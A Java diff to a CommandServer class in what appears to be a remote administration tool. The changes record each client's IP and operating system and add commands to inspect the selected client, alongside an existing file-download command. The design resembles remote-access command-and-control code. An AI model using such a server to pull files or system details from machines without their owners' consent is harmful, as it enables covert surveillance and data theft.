@@ -29,6 +29,9 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	private ClientPool clients;
 	private int currentClient = -1;
 	
+	// Current connection
+	private Socket currentSocket;
+	
 	// Log requests
 	private Log log;
 	
@@ -130,6 +133,19 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			
 		});
 		
+		// Display client info
+		cmdsServer.put("info", new Command(){
+
+			@Override
+			public String exec(String[] args) {
+				if (currentClient >= 0) {					
+					return clients.get(currentClient).toString();
+				}
+				return "No selected client.";
+			}
+			
+		});
+		
 		
 		
 		// ***** CONNECTED CLIENT COMMANDS ***** //
@@ -139,6 +155,9 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		
 		// Download a file
 		cmdsServer.put("dwnld", new ClientCommand(this, "DWNLD"));
+		
+		// Retrieve OS
+		cmdsServer.put("os", new ClientCommand(this, "OS"));
 		
 		
 		
@@ -151,12 +170,19 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			public String exec(String[] args) {
 
 				ConnectedClient client = clients.findByMac(args[0]);
+				int id;
 				
-				if (client != null) {		// Already known client
-					return Integer.toString(client.getId()); 
-				} else { 					// New client
-					return Integer.toString(clients.addClient(args[0]));
-				}
+				if (client != null) // Already known client
+					id = client.getId(); 
+				else				// New client
+					id = clients.addClient(args[0]);
+				
+				// Storing IP
+				if (currentSocket != null)
+					clients.get(id).setInetAddress(
+							currentSocket.getInetAddress().toString());
+				
+				return Integer.toString(id);
 			}
 			
 		});
@@ -176,6 +202,20 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			
 		});
 		
+		cmdsClient.put("OS_OUT", new Command(){
+
+			@Override
+			public String exec(String[] args) {
+				StringBuilder sb = new StringBuilder();
+				for (int i = 1; i < args.length; i++) {
+					sb.append(args[i] + (i == args.length - 1 ? "" : " "));
+				}
+				clients.identify(args[0]).setOs(sb.toString());
+				return "";
+			}
+			
+		});
+		
 	}
 	
 
@@ -183,8 +223,7 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	public String getResponse(Socket socket)
 			throws IOException {
 		
-		// TODO: Identify client
-		// InetAddress client = socket.getInetAddress();
+		currentSocket = socket;
 		
 		// Reading request
 		BufferedReader reader = new BufferedReader(
@@ -221,9 +260,11 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		if (cmdsClient.containsKey(pCmd.cmd)) {
 			String response = cmdsClient.get(pCmd.cmd).exec(pCmd.args);
 			log.add(1, socket.getInetAddress() + "\t" + response);
+			currentSocket = null;
 			return response;
 		}
-			
+		
+		currentSocket = null;
 		return ERROR_COMMAND_NOT_FOUND;
 	}
 
